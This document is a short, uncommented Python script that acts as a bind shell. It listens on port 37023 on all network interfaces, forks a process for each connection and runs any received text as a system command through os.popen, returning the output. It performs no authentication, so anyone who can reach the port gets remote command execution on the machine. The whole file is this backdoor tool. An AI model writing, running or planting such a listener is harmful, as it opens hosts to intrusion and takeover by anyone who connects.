import socket as ss
import os
import sys


HOST = ("0.0.0.0",37023)
PID = os.getpid()

def cmd(req):
	req = req.decode()
	resp = os.popen(req,'r').read()
	return resp

def session(c,addr):
	while True:
		try:
			c.send(b'0>> ')
		except:
			print ("Error sending prompt",flush=True)
		try:
			req = c.recv(1080)
			if req == b'':
				break
		except:
			break
		resp = cmd(req)
		c.send(resp.encode())

def main():
	o = ss.socket()
	o.bind(HOST)
	o.listen(0)
	while True:
		try:
			c , addr = o.accept()
		except KeyboardInterrupt:
			print("")
			o.close()
		except:
			print ('Force close')
			o.close()
		os.fork()
		if os.getpid() ==PID:
			continue
		else:
			sys.stdin.close()
			session(c,addr)
			c.close()
			exit(0)

if __name__ == "__main__":
	main()
